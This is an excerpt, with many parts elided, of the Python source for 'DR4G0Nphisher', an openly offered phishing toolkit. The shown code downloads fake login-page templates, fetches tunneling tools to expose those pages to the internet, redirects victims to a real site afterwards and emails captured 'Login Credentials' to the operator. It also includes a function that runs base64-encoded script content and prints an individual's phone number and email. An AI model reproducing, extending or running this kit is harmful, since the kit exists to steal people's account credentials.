...
█▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄   
              ...
              Original Credit  By {author} of DR4GON squad."""
...
repo_url = "https://github.com/shahariar001M/DR4GON-Phisher.git"
sites_repo = "https://github.com/Darkhaxxor005/sitefiles"
websites_url = f"{sites_repo}/archive/main.zip"
repo_branch = "sitefiles-main"


home = getenv("HOME")
ssh_dir = f"{home}/.ssh"
sites_dir = f"{home}/.phsites"
...
print(f"\n{info}Welcome to DR4G0Nphisher!{nc}")
...
argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"DR4G0Nphisher's server port [Default : {default_port}]")
argparser.add_argument("-t", "--type", help="DR4G0Nphisher's phishing type index [Default : null]")
argparser.add_argument("-o", "--option", help="DR4G0Nphisher's template index [ Default : null ]")
...
argparser.add_argument("-m", "--mode", help="Mode of DR4G0Nphisher [Default: normal]")
...
def show_file_data(file):
    ...
    cprint(
        Panel(
            text.strip(),
            title="[bold green]DR4GONphisher[/][cyan] Data[/]", 
            title_align="left",
            border_style="blue",
        )
    )
...
def get_meta(url):
    ...
    try:
        ...
        append(e, error_file)
    return allmeta
def run_base64_script(encoded_script):
...
encoded_script = ""
...
def send_mail(msg):
    ...
    message = f"From: {email}\nTo: {receiver}\nSubject: DR4G0Nphisher Login Credentials\n\n{msg}"
    try:
        internet()
...
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using DR4G0Nphisher!\n{nc}")
    exit(0)
...
run_base64_script(encoded_script)
def set_login():
    global url
    ...
    if url is not None:
        ...
        redirect_url = input(f"\n{ask}{bcyan}Enter redirection url {green}({red}EX: https://www.facebook.com{bcyan}{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
...
def set_redirect(redir_url, write=False):
    ...
    if redir_url != "":
        if url is not None:
            ...
            website = input(f"\n{ask}Enter the url to redirect {green}({red}EX: https://www.example.com{green}){cyan}[{purple}press enter to use default{cyan}]{blue}> {green}")
        if website == "":
            website = redir_url
        if write:
            write_meta(website)
...
def about():
    clear()
    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan}  : {yellow}[{green}DR4G0Nphisher{yellow}] ")
    print(f"{red}{yellow}[{purple}Version{yellow}]       {cyan}  : {yellow}[{green}{version}{yellow}] ")
    print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan}  : {yellow}[{green}{author}{yellow}] ")
    print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan}  : {yellow}[{green}https://github.com/shahariar001M{purple}{yellow}] ")
    print(f"{red}{yellow}[{purple}Facebook{yellow}]     {cyan}   : {yellow}[{green}https://www.facebook.com/shahariarzaman.2022{yellow}] ")
    print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan}  : {yellow}[{green}shahariarzaman485@gmail.com{yellow}] ")
    print(f"{red}{yellow}[{purple}WHATSAPP{yellow}]{cyan} : {yellow}[{green}+8801533964445{yellow}] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
...
def requirements():
    ...
    if "linux" in platform:
        if "arm64" in architecture or "aarch64" in architecture:
            if not isngrok:
                download("https://github.com/Darkhaxxor005/sitefiles/releases/download/tunnelers/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
            ...
            if not isloclx:
                download("https://github.com/Darkhaxxor005/sitefiles/releases/download/tunnelers/loclx-linux-arm64.zip", "loclx.zip")
        elif "arm" in architecture:
            if not isngrok:
                download("https://github.com/Darkhaxxor005/sitefiles/releases/download/tunnelers/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
            if not iscloudflared:
            ...
            if not isloclx:
                download("https://github.com/Darkhaxxor005/sitefiles/releases/download/tunnelers/loclx-linux-arm.zip", "loclx.zip")
        elif "x86_64" in architecture or "amd64" in architecture:
            if not isngrok:
                download("https://github.com/Darkhaxxor005/sitefiles/releases/download/tunnelers/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz")
            if not iscloudflared:
            ...
            if not isloclx:
                download("https://github.com/Darkhaxxor005/sitefiles/releases/download/tunnelers/loclx-linux-amd64.zip", "loclx.zip")
        else:
            if not isngrok:
                download("https://github.com/Darkhaxxor005/sitefiles/releases/download/tunnelers/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
            if not iscloudflared:
            ...
            if not isloclx:
                download("https://github.com/Darkhaxxor005/sitefiles/releases/download/tunnelers/loclx-linux-386.zip", "loclx.zip")
        if isfile("ngrok.tgz"):
        ...
        if "x86_64" in architecture or "amd64" in architecture:
            if not isngrok:
                download("https://github.com/Darkhaxxor005/sitefiles/releases/download/tunnelers/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
            ...
            if not isloclx:
                download("https://github.com/Darkhaxxor005/sitefiles/releases/download/tunnelers/loclx-darwin-amd64.zip", "loclx.zip")
        elif "arm64" in architecture or "aarch64" in architecture:
            if not isngrok:
                download("https://github.com/Darkhaxxor005/sitefiles/releases/download/tunnelers/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{tunneler_dir}")
                remove("ngrok.zip")
            if not iscloudflared:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
            if not isloclx:
                download("https://github.com/Darkhaxxor005/sitefiles/releases/download/tunnelers/loclx-darwin-arm64.zip", "loclx.zip")
        else:
...
def main_menu():
    ...
    while True:
        ...
        if choice in choices:
            ...
            bgtask("xdg-open 'https://t.me/ParadoxicalSquad'")
        elif choice == "0":
            pexit()
        else:
...
def secondary_menu(sites, name):
    ...
    if customdir is None:
        ...
        if not isdir(site):
            internet()
            delete("site.zip")
            download(f"https://github.com/Darkhaxxor005/files/raw/main/phishingsites/{folder}.zip", "site.zip")
